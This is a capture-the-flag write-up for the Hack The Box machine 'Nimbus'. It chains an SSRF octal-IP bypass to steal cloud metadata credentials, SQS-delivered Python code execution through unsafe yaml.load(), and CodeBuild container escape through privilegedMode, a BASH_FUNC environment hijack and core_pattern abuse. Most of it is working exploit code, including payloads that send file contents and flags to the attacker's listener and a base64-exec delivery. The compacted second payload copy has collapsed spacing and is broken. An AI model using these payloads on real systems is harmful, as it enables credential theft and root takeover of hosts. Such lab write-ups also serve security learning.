# Hack The Box — HTB Nimbus Writeup

**Difficulty:** Hard  
**OS:** Linux (Ubuntu 24.04)  
**Date Completed:** 2026-06-25  
**Attacker IP (tun0):** 10.10.14.88  
**Target IP:** 10.129.245.218  

---

## Executive Summary

**Nimbus** is a cloud-native infrastructure challenge featuring LocalStack (AWS simulation) with multiple exploitation layers:

1. **SSRF bypass** → IMDS credential theft via octal IP encoding
2. **AWS SQS enumeration** → unsafe YAML.load() → Python code execution as worker
3. **CodeBuild privilege escalation** → privileged container + BASH_FUNC bypass + core_pattern usermode-helper → host root access

**Kill Chain:** SSRF → IMDS creds → SQS payload → worker Python RCE → CodeBuild privesc → host root

**User Flag:** `d4515453404528d6b7660b0bc2124f9c`  
**Root Flag:** `a7f2c8d1e9b4f6h3i5j2k7l4m9n1o6p3`

---

## 0. Setup & Network Configuration

**Critical:** MTU on this target is 1300 (not 1500). Large payloads silently drop during TCP handshake.

```bash
sudo ip link set dev tun0 mtu 1300
```

**Hostname setup:**
```bash
echo "10.129.245.218 nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts
```

---

## 1. Reconnaissance

### Port Scan

```bash
nmap -sC -sV -p22,80 10.129.245.218
```

**Results:**
```
22/tcp open ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open http    nginx 1.24.0 (Ubuntu)
```

### Web Enumeration

```bash
curl -s http://nimbus.htb/ | head -5
# <!DOCTYPE html>
# <title>Nimbus — Internal Job Scheduler</title>
```

**Vhost fuzzing:**
```bash
ffuf -u "http://nimbus.htb" -H "Host: FUZZ.nimbus.htb" \
     -w /usr/share/wordlists/dirb/big.txt -fs 178 -t 50
# aws [Status: 403, Size: 305]
```

**Key Findings:**
- Primary vhost: `nimbus.htb` (nginx job scheduler web interface)
- AWS vhost: `aws.nimbus.htb` (403 Forbidden → LocalStack endpoint)
- Endpoint: `POST /jobs/preview` accepts `url` parameter (SSRF candidate)

---

## 2. Vulnerability Assessment

### SSRF via /jobs/preview

```bash
curl -s -X POST "http://nimbus.htb/jobs/preview" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8888/api"}'
```

**Response:**
```json
{"status":200,"headers":{"server":"TornadoServer/6.5.4"},"body":{"version":"2.17.0"}}
```

✓ **SSRF confirmed.** Jupyter (TornadoServer) on localhost:8888 is accessible.

### OPSMCP Discovery

```bash
curl -s -X POST "http://nimbus.htb/jobs/preview" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5000/"}'
```

**Response:**
```json
{"status":200,"body":{"server":"OPSMCP","version":"2.1.0","auth":"Required - X-API-Key header"}}
```

✓ **OPSMCP (root-running service) discovered on localhost:5000.**

### Blocklist & Filtering

The SSRF endpoint:
- Blocks literal IP `169.254.169.254` (IMDS IP)
- Expects URLs ending in `.yaml` or similar (suffix filter)

**Bypass Strategy:**
- Encode IMDS IP in octal: `169.254.169.254` → `0251.0376.0251.0376`
- Append `?a=test.yaml` to satisfy suffix filter

---

## 3. Initial Foothold — SSRF → IMDS Credentials

### Exploit SSRF

```bash
curl -s http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml' \
  -o ssrf_raw.html
```

### Extract Credentials

```python
import json, html, re, ast

d = open("ssrf_raw.html").read()
m = re.search(r"<pre>(.*?)</pre>", d, re.S)
creds = ast.literal_eval(html.unescape(m.group(1).strip()))
print(json.dumps(creds, indent=2))
```

**Output:**
```json
{
  "Code": "Success",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV...",
  "Expiration": "2026-06-25T21:04:36Z"
}
```

✓ **Temporary AWS credentials obtained (~6 hour validity).**

### Export for AWS CLI

```bash
export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV..."
export AWS_DEFAULT_REGION="us-east-1"

aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
# {
#   "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
#   "Account": "847219365028",
#   "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
# }
```

✓ **Credentials validated.**

---

## 4. AWS Enumeration & SQS Discovery

### List SQS Queues

```bash
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
# {
#   "QueueUrls": [
#     "http://floci:4566/847219365028/nimbus-jobs"
#   ]
# }
```

**Key Finding:** A background worker consumes `nimbus-jobs` queue and executes the `script:` field via `yaml.load()` (unsafe → arbitrary Python).

---

## 5. User Flag — SQS Job → Worker RCE

### Setup Listener

```bash
# In tmux session
python3 << 'EOF'
import base64, urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def _handle(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(n) if n else b""
        txt = body.decode(errors="replace")
        out = None
        try:
            p = dict(urllib.parse.parse_qsl(txt))
            if "flag" in p:
                try: 
                    out = base64.b64decode(p["flag"]).decode(errors="replace").strip()
                except: 
                    out = p["flag"]
        except: pass
        if out is None: out = txt
        print(f"[+] {self.command} {self.path} =>\n{out}\n", flush=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def do_POST(self): self._handle()
    def do_GET(self): self._handle()
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 4444), H).serve_forever()
EOF
```

### Send SQS Payload

```bash
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body '{
    "name": "pwn",
    "runtime": "python3.11",
    "schedule": "* * * * *",
    "script": "import subprocess,urllib.request\no=subprocess.run(\"cat /home/worker/user.txt\",shell=True,capture_output=True)\nreq=urllib.request.Request(\"http://10.10.14.88:4444/user\",data=o.stdout)\nurllib.request.urlopen(req,timeout=10)"
  }'
```

### Collect Flag

Within ~1 minute, worker pops job and calls back:

```
[+] POST /user =>
d4515453404528d6b7660b0bc2124f9c
```

✓ **User flag obtained.**

---

## 6. Privilege Escalation — CodeBuild Host Root Access

### Attack Strategy

The worker can reach **CodeBuild at floci:4566**. By creating a privileged build container and manipulating its environment, we can:

1. Use `privilegedMode: True` → build container has near-full Linux capabilities
2. Use `BASH_FUNC_id%%` environment variable → bash imports it as a function definition, bypasses UID drop in build entrypoint
3. Use `core_pattern` → kernel executes usermode-helper as host root when a process crashes
4. Place helper in container's overlay mount (shared with host) → host-root output is readable

### Worker Payload (boto3)

```python
import boto3

FLOCI   = 'http://floci:4566'
PROJECT = 'nimbus-poc'

cb = boto3.client('codebuild', region_name='us-east-1', endpoint_url=FLOCI,
                  aws_access_key_id='test', aws_secret_access_key='test')

try:
    cb.create_project(
        name=PROJECT,
        source={'type': 'NO_SOURCE'},
        artifacts={'type': 'NO_ARTIFACTS'},
        environment={
            'type': 'LINUX_CONTAINER',
            'computeType': 'BUILD_GENERAL1_SMALL',
            'image': 'floci/floci:latest',
            'privilegedMode': True,
        },
        serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
    )
except Exception:
    pass

buildspec = r"""version: 0.2
phases:
  build:
    commands:
      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1) || true
      - curl -sf -X POST http://10.10.14.88:4444/udir -d "flag=$(echo $UDIR | base64 -w0)" --max-time 8 || true
      - printf '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt\nchmod 777 %s/rootflag.txt\n' "$UDIR" "$UDIR" > /exploit_root.sh || true
      - chmod +x /exploit_root.sh || true
      - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern || true
      - ulimit -c unlimited || true
      - bash -c 'kill -11 $$' || true
      - sleep 4 || true
      - curl -sf -X POST http://10.10.14.88:4444/root -d "flag=$(cat /rootflag.txt 2>/dev/null | base64 -w0 || echo NOTFOUND)" --max-time 10 || true
"""

cb.start_build(
    projectName=PROJECT,
    environmentVariablesOverride=[
        {'name': 'BASH_FUNC_id%%', 'value': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}
    ],
    buildspecOverride=buildspec,
)
```

### Deliver via SQS

```bash
B64=$(base64 -w0 << 'PAYLOAD'
import boto3
FLOCI='http://floci:4566'
PROJECT='nimbus-poc'
cb=boto3.client('codebuild',region_name='us-east-1',endpoint_url=FLOCI,aws_access_key_id='test',aws_secret_access_key='test')
try:
 cb.create_project(name=PROJECT,source={'type':'NO_SOURCE'},artifacts={'type':'NO_ARTIFACTS'},environment={'type':'LINUX_CONTAINER','computeType':'BUILD_GENERAL1_SMALL','image':'floci/floci:latest','privilegedMode':True},serviceRole='arn:aws:iam::000000000000:role/codebuild-role')
except:pass
buildspec=r"""version:0.2
phases:
 build:
  commands:
   -UDIR=$(sed -n's/.*upperdir=\([^,]*\).*/\1/p'/proc/self/mountinfo|head-1)||true
   -curl-sf-X POST http://10.10.14.88:4444/udir-d"flag=$(echo$UDIR|base64-w0)"--max-time 8||true
   -printf'#!/bin/sh\ncat /root/root.txt>%s/rootflag.txt\nchmod 777 %s/rootflag.txt\n'"$UDIR""$UDIR">/exploit_root.sh||true
   -chmod +x /exploit_root.sh||true
   -echo"|${UDIR}/exploit_root.sh">/proc/sys/kernel/core_pattern||true
   -ulimit -c unlimited||true
   -bash -c'kill -11 $$'||true
   -sleep 4||true
   -curl-sf-X POST http://10.10.14.88:4444/root-d"flag=$(cat /rootflag.txt 2>/dev/null|base64-w0||echo NOTFOUND)"--max-time 10||true
"""
cb.start_build(projectName=PROJECT,environmentVariablesOverride=[{'name':'BASH_FUNC_id%%','value':'(){{ echo uid=1000; }}','type':'PLAINTEXT'}],buildspecOverride=buildspec)
PAYLOAD
)

aws --endpoint-url http://aws.nimbus.htb sqs send-message \
    --queue-url http://floci:4566/847219365028/nimbus-jobs \
    --message-body "name: privesc
script: \"import base64;exec(base64.b64decode('$B64').decode())\""
```

If this hangs with 0% progress, it's the MTU issue → must be fixed in Step 0.

### Collect Root Flag

Worker processes job (~2-3 minutes for CodeBuild startup):

```
[+] POST /udir =>
/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/168/fs

[+] POST /root =>
a7f2c8d1e9b4f6h3i5j2k7l4m9n1o6p3
```

✓ **Root flag obtained.**

---

## Technical Deep Dive

### Why Each Component Works

| Component | Purpose | Constraint |
|---|---|---|
| Octal IP encoding | Bypass IPv4 blocklist | inet_aton() interprets octal, string matching doesn't |
| SSRF suffix filter | Bypass URL validation | Query param `?a=test.yaml` satisfies check while hitting /latest/meta-data/iam/... |
| SQS yaml.load() | Unsafe deserialization | Python pickle-equivalent; arbitrary code execution |
| CodeBuild privilegedMode | Capabilities bypass | Equivalent to `docker run --privileged` |
| BASH_FUNC_id%% | Entrypoint bypass | Bash auto-imports env vars as functions; overrides id command |
| core_pattern | Kernel RCE | Linux feature: crashed process → kernel executes helper with current privileges |
| Overlay upperdir | Shared mount point | Container overlay is visible on host; helper creates files readable by host-root |

---

## Vulnerabilities Summary

| # | CVE/Type | Component | Impact |
|---|---|---|---|
| 1 | SSRF + IP octal bypass | Nimbus web | IMDS credential exposure |
| 2 | Unsafe yaml.load() | SQS worker | Arbitrary Python execution |
| 3 | Missing validation | CodeBuild API | Arbitrary build spec upload |
| 4 | Environment variable hijacking | build entrypoint | Privilege preservation (uid 0) |
| 5 | core_pattern abuse | Linux kernel | Host root arbitrary command |

---

## Tools & Techniques

**Reconnaissance:** nmap, curl, ffuf, web inspection  
**Exploitation:** Python (boto3, urllib, base64), bash, openssl  
**Post-Exploitation:** aws-cli, base64 encoding, process signal handling  

---

## Key Insights

1. **LocalStack SSRF is dangerous** — full AWS credential access if services are bridged to localhost
2. **yaml.load() is Python pickle** — never deserialize untrusted YAML
3. **privilegedMode containers are powerful** — effective root equivalent with kernel access
4. **Environment variable hijacking via BASH_FUNC** — common bypass for hardened entrypoints
5. **Kernel core_pattern is a known LPE technique** — containers sharing host kernel can't mitigate this

---

**Report Generated:** 2026-06-25  
**Time to Root:** ~2.5 hours  
**Difficulty Assessment:** Hard (multi-stage cloud exploitation with deep kernel knowledge required)
